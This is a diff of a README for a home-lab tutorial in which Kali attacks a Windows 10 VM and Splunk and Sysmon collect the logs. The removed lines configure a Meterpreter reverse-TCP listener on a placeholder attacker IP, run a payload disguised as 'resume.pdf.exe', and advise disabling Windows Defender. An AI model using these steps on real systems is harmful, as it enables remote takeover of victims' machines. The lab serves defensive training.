@@ -1,76 +1,67 @@
 # SOC Home Lab: Attack & Defense Simulation
-1. Open Metasploit on Kali:
-   ```bash
-   msfconsole
-   ```
-2. Configure the listener:
-   ```bash
-   use exploit/multi/handler
-   set payload windows/x64/meterpreter/reverse_tcp
-   set LHOST <Attacker_IP>
-   set LPORT 4444
-   exploit
-   ```
-3. Deploy `resume.pdf.exe` on Windows 10 and execute it.
-4. If successful, you gain a Meterpreter session:
-   ```bash
-   meterpreter > sysinfo
-   ```
 
 ---
 
-## Step 6: Monitoring Logs with Splunk
+## 📌 Table of Contents
 
-1. Open Splunk and search for unauthorized activity:
-   ```
-   index=main sourcetype=WinEventLog:Security
-   ```
-2. Identify anomalies related to unauthorized access.
-3. Create alerts to detect suspicious behavior.
-
----
-
-## 🔍 Troubleshooting
-
-### ❌ Metasploit Handler Not Receiving a Session
-- Ensure Windows Defender is **disabled** to prevent blocking the payload.
-- Double-check **LHOST and LPORT settings** in both `msfvenom` and `msfconsole`.
-- Run the payload on Windows as **Administrator**.
-
-### ❌ Splunk Not Logging Events
-- Verify Sysmon is correctly installed and running.
-- Ensure Windows Event Logging is enabled in Splunk.
-- Restart Splunk and recheck the event index.
+1. [Introduction](#introduction)
+2. [Prerequisites](#prerequisites)
+3. [Network Topology](#network-topology)
+4. [Step 1: Setting Up Virtual Machines](#step-1-setting-up-virtual-machines)
+5. [Step 2: Installing Splunk for Log Monitoring](#step-2-installing-splunk-for-log-monitoring)
+6. [Step 3: Installing Sysmon on Windows 10](#step-3-installing-sysmon-on-windows-10)
+7. [Step 4: Generating Malware with msfvenom](#step-4-generating-malware-with-msfvenom)
+8. [Step 5: Setting Up a Metasploit Listener](#step-5-setting-up-a-metasploit-listener)
+9. [Step 6: Monitoring Logs with Splunk](#step-6-monitoring-logs-with-splunk)
+10. [Troubleshooting](#troubleshooting)
+11. [Next Steps & Future Improvements](#next-steps--future-improvements)
+12. [How to Contribute](#how-to-contribute)
+13. [Conclusion](#conclusion)
 
 ---
 
-## 🎯 Next Steps & Future Improvements
+## 📌 Introduction
 
-✔️ Integrate **ELK Stack** for enhanced log analysis.
-✔️ Automate attack execution using **Python scripts**.
-✔️ Implement **Wazuh SIEM** for better threat detection.
+This project demonstrates the setup of a home lab environment for cybersecurity testing, including:
 
----
+- **Attacker Machine** → Kali Linux
+- **Target Machine** → Windows 10 VM
+- **Logging System** → Splunk for monitoring malicious activities
 
-## 🤝 How to Contribute
-
-Interested in improving this project? Contributions are welcome!
-
-1. Fork the repository.
-2. Create a new branch with your improvements.
-3. Submit a pull request for review.
+Key activities include:
+- Setting up virtual machines
+- Installing and configuring Sysmon for log collection
+- Deploying malware using `msfvenom`
+- Monitoring attacks using Splunk
 
 ---
 
-## 🎯 Conclusion
+## 🔧 Prerequisites
 
-This project demonstrates how to:
+| Requirement                | Description                                  |
+|----------------------------|----------------------------------------------|
+| **RAM**                    | At least **16GB** (to run multiple VMs)     |
+| **Virtualization Software** | VMware Workstation or VirtualBox            |
+| **Operating Systems**       | ISO files for Windows 10 and Kali Linux     |
+| **Logging Tools**           | Splunk and Sysmon setup files               |
+| **Internet Connection**     | Required for downloading and configuring tools |
 
-- Set up a cybersecurity home lab 🏠
-- Deploy and detect malware 🔍
-- Use Splunk for threat monitoring ⚠️
+---
 
-> **Note:** This is for educational purposes only. Do not use these techniques for unauthorized activities.
+## 🎬 Network Topology Animation
 
-### 📌 Connect with Me:
-- [LinkedIn](https://www.linkedin.com/in/wasim-hassan-030b80349/)
+Click below to view the **interactive network diagram**:
+
+➡️ [View Animation](https://wasim-hassan1.github.io/SOC-Home-Lab-Attack-Defense/network-diagram.html.svg)
+
+📌 *The Kali Linux machine attacks the Windows VM, and logs are collected by Splunk for analysis.*
+
+---
+
+## Step 1: Setting Up Virtual Machines
+
+### 🖥️ 1.1 Install Kali Linux (Attacker Machine)
+
+1. Download **Kali Linux ISO** from [Kali Official Website](https://www.kali.org/downloads/).
+2. Create a new VM in VMware/VirtualBox and install Kali Linux.
+3. Update and upgrade Kali:
